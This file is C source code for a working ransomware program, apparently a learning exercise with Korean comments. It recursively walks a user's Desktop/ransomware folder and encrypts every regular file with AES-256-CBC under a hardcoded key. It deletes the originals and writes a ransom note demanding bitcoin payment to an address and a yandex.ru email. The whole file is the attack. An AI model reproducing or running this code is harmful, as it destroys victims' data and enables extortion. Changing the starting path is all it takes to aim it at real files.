#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>
#include <string.h>
#include <dirent.h>
#include <openssl/evp.h>
#include <openssl/aes.h>

void ls_dir(char* start_path);
void encryptfile(FILE * fpin,FILE* fpout,unsigned char* key, unsigned char* iv);

int main()
{
    
    char* start_path;
    char* home;
    char* uid;
    uid_t user_id;
   	struct passwd *user_pw;
    
    struct passwd *lpwd;
    printf("UID    : %d\n",getuid());
    printf("EUID   : %d\n" ,geteuid());
    
    //lpwd = getpwuid(getuid());
    //printf("UNAME  : %s\n", lpwd->pw_name);
    
    lpwd = getpwuid(geteuid());
    printf("EUNAME : %s\n", lpwd->pw_name);
    
    
    home = "/home/";
   	//user_id = lpwd->pw_name;
    start_path = (char*) malloc(strlen(home)+strlen(lpwd->pw_name)+strlen("/Desktop/ransomware/")+2);
    strcpy(start_path, home);
    strcat(start_path, lpwd->pw_name);
    strcat(start_path, "/Desktop/ransomware/");
    printf("%s", start_path);
    
    ls_dir(start_path);
    
    return 0;
}

void ls_dir(char* start_path)
{
    unsigned char key[] = "12345678901234561234567890123456";                                               //32 char 256bit key
    unsigned char iv[] = "1234567890123456";                                                                //same size as block 16 char 128 bit block, init vector: 알고리즘 수행 시 넣는 값
    //int full_path_readme_count = 0;
    
    DIR* dir;                                                                                                   //dir = opendir(start_path)의 반환값을 가짐
    struct dirent *ent;                                                                                         //ent = 개방한 파일(readdir(dir))의 정보를 저장할 구조체 변수
    if((dir=opendir(start_path)) !=NULL)
        //if((dir=opendir(test_path)) !=NULL)
    {
        //full_path_readme_count = 0;
        while((ent=readdir(dir)) !=NULL)
        {
            int len = strlen(ent->d_name);
            const char* last_four = &ent->d_name[len-4];
            if(strcmp(last_four,".enc") != 0)                                                                   //0: 일치, 암호화 파일의 확장자: .enc
            {
                if(ent->d_type == 8)                                                                            // DT_REG == this is a regular file
                {
                    char* full_path_readme =(char*) malloc(strlen("RANSOMEWARE_INFO")+strlen(start_path)+2);    // full_path_readme = '/home/RANSOMEWARE_INFO\n'
                    strcpy(full_path_readme,start_path);                                                        // full_path_readme = ' '/home/' '
                    strcat(full_path_readme,"RANSOMEWARE_INFO");                                                // full_path_readme = ' '/home/' + 'RANSOMEWARE_INFO\n'
                    char* full_path =(char*) malloc(strlen(ent->d_name)+strlen(start_path)+2);                  // full_path = '/home/ent->d_name'
                    strcpy(full_path,start_path);
                    strcat(full_path,ent->d_name);                                                              // ?
                    char* new_name = (char*) malloc(strlen(full_path)+strlen(".enc")+1);                        // new_name = full_path.enc
                    strcpy(new_name,full_path);
                    strcat(new_name,".enc");
                    
                    //printf("%d - %s\n", /***/ent->d_type, /***/new_name);
                    
                    if(strcmp(full_path,"/etc/passwd") !=0 && strcmp(full_path,"/etc/shadow")!=0 && strcmp(full_path,"/etc/sudoers") !=0)   //?
                    {
                        FILE* fpin;     //path
                        FILE* fpout;    //file name
                        FILE* fpreadme; //file RANSOMEWARE_INFO.(txt?)
                        
                        fpin=fopen(full_path,"rb");
                        fpout=fopen(new_name,"wb");
                        
                        fpreadme=fopen(full_path_readme,"w");                                                   //? in the all directory?
                        fprintf(fpreadme,"You have been PWNED! \n\n Hear me ROAR All files belong to me and are in an encrypted state. I have but two simple commands.\n\n 1. Tranfer money to my bitcoin address \n 2. Email me with your bitcoin address that you used to send the money. Then I will email with an antidote \n\n Pay me Now! \n My Bitcoin Address:Xg7665tgf677hhjhjhhh\n Email:xxxyy@yandex.ru \n");
                        fclose(fpreadme);
                        //full_path_readme_count++;
                        
                        encryptfile(fpin,fpout,key,iv);                                                         //encryption
                        
                        fclose(fpin);
                        fclose(fpout);
                        
                        remove(full_path);
                    }
                    free(full_path);
                    free(new_name);
                }
                else if(ent->d_type==4)                                                                         //DT_DIR == this is a directory file
                {
                    char *full_path=(char*) malloc(strlen(start_path)+strlen(ent->d_name)+2);
                    strcpy(full_path,start_path);                                                               // full_path_readme = ' '/home/' '
                    strcat(full_path,ent->d_name);                                                              // full_path = '/home/ent->d_name'
                    strcat(full_path,"/");                                                                      // full_path = '/home/ent->d_name'
                    //printf("%d - ", /***/ent->d_type);
                    printf("%s\n",full_path);
                    if(full_path != start_path && ent->d_name[0] != '.')
                    {
                        ls_dir(full_path);                                                                      // ?
                    }
                    
                    free(full_path);
                }
            }
            //printf("full_path_readme_count: %d", &full_path_readme_count);
        }
    }
}

void encryptfile(FILE * fpin, FILE* fpout,unsigned char* key, unsigned char* iv)
{
    //Using openssl EVP to encrypt a file
    
    const unsigned bufsize = 4096;
    unsigned char* read_buf = malloc(bufsize);
    unsigned char* cipher_buf ;
    unsigned blocksize;
    int out_len;
    
    EVP_CIPHER_CTX ctx;
    
    //init: 암호화 관련 정보 설정(암호화 방식, 키 길이, 비밀 번호 등)
    EVP_CipherInit(&ctx,EVP_aes_256_cbc(),key,iv,1);                //int EVP_CipherInit(EVP_CIPHER_CTX *ctx, const EVP_CIPHER *type, unsigned char *key, unsigned char *iv, int enc);
    blocksize = EVP_CIPHER_CTX_block_size(&ctx);                    //EVP_CIPHER_CTX_block_size() return the block size
    cipher_buf = malloc(bufsize+blocksize);
    
    // read file and write encrypted file until eof
    while(1)
    {
        int bytes_read = fread(read_buf,sizeof(unsigned char),bufsize,fpin);    //return the count(bufsize): 반복횟수,size_t fread(void* buffer, size_t size, size_t count, FILE* stream)
        //update: 설정한 암호화 방식으로 블럭을 분할해 암호화를 수행, ECB CBC 모드 중 cbc 모드 사용
        EVP_CipherUpdate(&ctx,cipher_buf,&out_len,read_buf, bytes_read);        //int EVP_CipherUpdate(EVP_CIPHER_CTX *ctx, unsigned char *out, int *outl, unsigned char *in, int inl);
        fwrite(cipher_buf,sizeof(unsigned char),out_len,fpout);                 //size_t fwrite(const void* buffer, size_t size, size_t count, FILE* stream): 버퍼에 저장된 데이터를 파일에 출력
        if(bytes_read < bufsize)
        {
            break;//EOF
        }
    }
    
    //final: 입력한 plain text의 크기가 블럭의 배수가 아닐 경우 데이터 끝에 여분의 데이터 바이트가 남게 되는 해당 바이트를 패딩하여 처리가능한 크기의 블럭으로 만든 다음 암호화를 수행
    EVP_CipherFinal(&ctx,cipher_buf,&out_len);
    fwrite(cipher_buf,sizeof(unsigned char),out_len,fpout);
    
    free(cipher_buf);
    free(read_buf);
}
